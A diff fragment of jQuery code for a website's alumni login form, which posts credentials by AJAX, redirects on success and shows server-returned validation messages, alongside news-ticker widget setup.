+  $(function () {
+    $('.newstape').newstape();
+  });
+
+  $(function () {
+    $('.newstape_1').newstape();
+  });
+
+  $(document).ready(function () {
+    $('#frmAlumniLogin').submit(function () {
+      validateAlumniSend();
+      return false;
+    });
+  });
+
+  //ALUMNI LOGIN
+  function validateAlumniSend() {
+    //if($('#email').val() != "" && $('#pwd').val() != "")
+    //	{	
+    $('.div-spn-error').remove();
+    $.post('ajax/ajax_alumnilogin.php', $("#frmAlumniLogin").serialize(), function (data) {
+      if (data[0].resSuccess == 1) {
+        window.location.href = "alumni_profile.php";
+        return false;
+      } else if (data[0].resSuccess == 2) {
+        if (data[0].errtype == 'Validation') {
+          for (i = 0; i < data[0].arrError.length; i++) {
+            $('#spn_' + data[0].arrError[i][0]).remove();
+            $("#" + data[0].arrError[i][0]).after("<div id='spn_" + data[0].arrError[i][0] +
+              "' class='div-spn-error'>" + data[0].arrError[i][1] + "</div>");
+            //$('#' + data[0].arrError[i][0]).addClass("border-danger");		
+          }
+        } else {
+          $('.errMsgText').html(data[0].msg);
+          $('#usrpwd').val('');
+        }
+        return false;
+      } else {
+        return false;
+      }
+    });
+    //	}
+  }
+</script>
